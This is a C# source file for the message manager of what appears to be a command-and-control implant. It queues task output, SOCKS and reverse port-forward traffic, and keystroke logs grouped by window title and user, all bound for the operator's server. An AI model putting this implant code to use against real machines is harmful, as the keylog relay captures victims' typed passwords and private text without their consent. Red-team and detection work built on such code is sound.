using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;
using System.Text;
using System.Text.Json;

namespace Agent.Managers
{
    public class MessageManager : IMessageManager
    {
        private ConcurrentDictionary<string, TaskResponse> responseResults = new ConcurrentDictionary<string, TaskResponse>();
        private ConcurrentBag<string> responseStrings = new ConcurrentBag<string>();
        private ConcurrentDictionary<int, ServerDatagram> socksOut = new ConcurrentDictionary<int, ServerDatagram>();
        private ConcurrentDictionary<int, ServerDatagram> rpfwdOut = new ConcurrentDictionary<int, ServerDatagram>();
        private ConcurrentBag<InteractMessage> interactiveOut = new ConcurrentBag<InteractMessage>();
        private ConcurrentBag<DelegateMessage> delegateMessages = new ConcurrentBag<DelegateMessage>();
        private ConcurrentDictionary<string, ServerJob> activeJobs = new ConcurrentDictionary<string, ServerJob>();
        private StringWriter sw = new StringWriter();
        private bool stdOutIsMonitored = false;
        private string monitoring_task = string.Empty;
        private TextWriter origStdOut;
        private string klTask = string.Empty;
        private Dictionary<string, Keylogs> klLogs = new Dictionary<string, Keylogs>();
        private ILogger logger { get; set; }

        public MessageManager(ILogger logger)
        {
            this.logger = logger;
        }
        public void AddKeystroke(string window_title, string task_id, string key)
        {
            if (String.IsNullOrEmpty(klTask))
            {
                klTask = task_id;
            }

            if (!klLogs.ContainsKey(window_title))
            {
                klLogs.Add(window_title, new Keylogs()
                {
                    window_title = window_title,
                    user = Environment.UserName,
                    builder = new StringBuilder()
                });
            }

            klLogs[window_title].builder.Append(key);
        }
        public void AddDelegateMessage(DelegateMessage dm)
        {
            this.delegateMessages.Add(dm);
            return;
        }
        public void AddInteractMessage(InteractMessage im)
        {
            this.interactiveOut.Add(im);
        }
        public void AddDatagram(DatagramSource source, ServerDatagram dg)
        {
            switch (source)
            {
                case DatagramSource.Socks5:
                    AddSocksMessage(dg);
                    break;
                case DatagramSource.RPortFwd:
                    AddRpfwdMessage(dg);
                    break;
                default:
                    break;
            }
        }
        private void AddSocksMessage(ServerDatagram dg)
        {
            socksOut.AddOrUpdate(
                dg.server_id,
                dg,
                (existingKey, existingValue) =>
                {
                    // Merge bdata values
                    existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);

                    // Update the exit flag if needed
                    existingValue.exit |= dg.exit;

                    // Recalculate the Base64-encoded data string
                    existingValue.data = Misc.Base64Encode(existingValue.bdata);

                    return existingValue;
                });
        }
        private void AddRpfwdMessage(ServerDatagram dg)
        {
            rpfwdOut.AddOrUpdate(
                dg.server_id,
                dg,
                (existingKey, existingValue) =>
                {
                    // Merge bdata values
                    existingValue.bdata = Misc.CombineByteArrays(existingValue.bdata, dg.bdata);

                    // Update the exit flag if needed
                    existingValue.exit |= dg.exit;

                    // Recalculate the Base64-encoded data string
                    existingValue.data = Misc.Base64Encode(existingValue.bdata);

                    return existingValue;
                });
        }

        public void AddTaskResponse(ITaskResponse res)
        {
            if (res is null)
            {
                throw new ArgumentNullException(nameof(res));
            }

            switch (res)
            {
                case FileBrowserTaskResponse filebrowserTaskResponse:
                    this.responseStrings.Add(filebrowserTaskResponse.ToJson());
                    break;
                case ProcessTaskResponse processTaskResponse:
                    this.responseStrings.Add(processTaskResponse.ToJson());
                    break;
                case TaskResponse taskResponse:
                    AddTaskResponse(taskResponse);
                    break;

                default:
                    throw new ArgumentException($"Unsupported response type: {res.GetType().Name}");
            }
        }

        private void AddTaskResponse(TaskResponse res)
        {
            responseResults.AddOrUpdate(
                res.task_id,
                res,
                (existingKey, existingValue) =>
                {
                    // Append new user output
                    if (!string.IsNullOrEmpty(res.user_output))
                    {
                        existingValue.user_output = string.IsNullOrEmpty(existingValue.user_output)
                            ? res.user_output
                            : $"{existingValue.user_output}{Environment.NewLine}{res.user_output}";
                    }

                    // Update simple fields
                    existingValue.completed = res.completed;
                    existingValue.status = res.status;

                    // Update file_id if provided
                    if (!string.IsNullOrEmpty(res.file_id))
                    {
                        existingValue.file_id = res.file_id;
                    }

                    // Merge process_response
                    if (res.process_response is { Count: > 0 })
                    {
                        existingValue.process_response ??= new Dictionary<string, string>();

                        foreach (var kvp in res.process_response)
                        {
                            if (existingValue.process_response.TryGetValue(kvp.Key, out var existingValueString))
                            {
                                existingValue.process_response[kvp.Key] = $"{existingValueString}{Environment.NewLine}{kvp.Value}";
                            }
                            else
                            {
                                existingValue.process_response[kvp.Key] = kvp.Value;
                            }
                        }
                    }

                    return existingValue;
                });
        }
        public void AddTaskResponse(string res)
        {
            responseStrings.Add(res);
        }
        public List<string> GetTaskResponses()
        {

            // Process and clear completed responses
            foreach (var response in responseResults.Values)
            {
                if (response.completed)
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                responseStrings.Add(response.ToJson());
            }
            responseResults.Clear();

            // Transfer response strings to a return list and clear the cache
            var returnResults = new List<string>(responseStrings);
            responseStrings.Clear();

            // Handle keylog task, if applicable
            if (!string.IsNullOrEmpty(klTask) && klLogs.Count > 0)
            {
                var keyPressResponse = new KeyPressTaskResponse
                {
                    task_id = klTask,
                    keylogs = klLogs.Values.ToList(),
                };

                keyPressResponse.Prepare();
                returnResults.Add(keyPressResponse.ToJson());
                klLogs.Clear();
            }

            return returnResults;
        }
        public void Write(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(
                task_id,
                new TaskResponse
                {
                    user_output = output,
                    completed = completed,
                    status = status,
                    task_id = task_id
                },
                (key, existingResponse) =>
                {
                    existingResponse.user_output += output;

                    // Update only if necessary
                    existingResponse.completed |= completed;

                    if (!string.IsNullOrEmpty(status))
                        existingResponse.status = status;

                    return existingResponse;
                });
        }
        public void Write(string? output, string task_id, bool completed)
        {
            this.Write(output, task_id, completed, "");
        }
        public void WriteLine(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(
                task_id,
                new TaskResponse
                {
                    user_output = output + Environment.NewLine,
                    completed = completed,
                    status = status,
                    task_id = task_id
                },
                (key, existingResponse) =>
                {
                    existingResponse.user_output += output + Environment.NewLine;

                    // Update properties only if necessary
                    existingResponse.completed |= completed;

                    if (!string.IsNullOrEmpty(status))
                        existingResponse.status = status;

                    return existingResponse;
                });
        }
        public void WriteLine(string? output, string task_id, bool completed)
        {
            WriteLine(output, task_id, completed, "");
        }
        public void AddJob(ServerJob job)
        {
            this.activeJobs.TryAdd(job.task.id, job);
        }
        public bool TryGetJob(string task_id, out ServerJob? job)
        {
            return this.activeJobs.TryGetValue(task_id, out job);
        }
        public Dictionary<string, ServerJob> GetJobs()
        {
            return this.activeJobs.ToDictionary(kvp => kvp.Key, kvp => kvp.Value, this.activeJobs.Comparer);
        }
        public void CompleteJob(string task_id)
        {
            activeJobs.TryRemove(task_id, out _);
        }
        public string GetAgentResponseString()
        {
            var socksList = this.socksOut.ToList();
            socksList.Reverse();
            GetTasking gt = new GetTasking()
            {
                action = "get_tasking",
                tasking_size = -1,
                delegates = delegateMessages.ToList(),
                socks = this.socksOut.Values.ToList(),
                responses = this.GetTaskResponses(),
                rpfwd = this.rpfwdOut.Values.ToList(),
                interactive = this.interactiveOut.Reverse().ToList(),
            };

            this.socksOut.Clear();
            this.rpfwdOut.Clear();
            this.delegateMessages.Clear();
            this.interactiveOut.Clear();

            return JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking);
        }
        public bool HasResponses()
        {
         return this.responseResults.Count > 0 || this.responseStrings.Count > 0 || this.delegateMessages.Count > 0 || this.socksOut.Count > 0 
                || this.rpfwdOut.Count > 0;
        }
        public bool CaptureStdOut(string task_id)
        {
            if (stdOutIsMonitored)
            {
                return false;
            }

            monitoring_task = task_id;
            return true;
        }
        public bool ReleaseStdOut()
        {
            stdOutIsMonitored = false;
            Console.SetOut(origStdOut);
            return true;
        }
        public bool StdIsBusy()
        {
            return stdOutIsMonitored;
        }
        public async Task<string> GetStdOut()
        {
            return String.Empty;
        }
    }
}
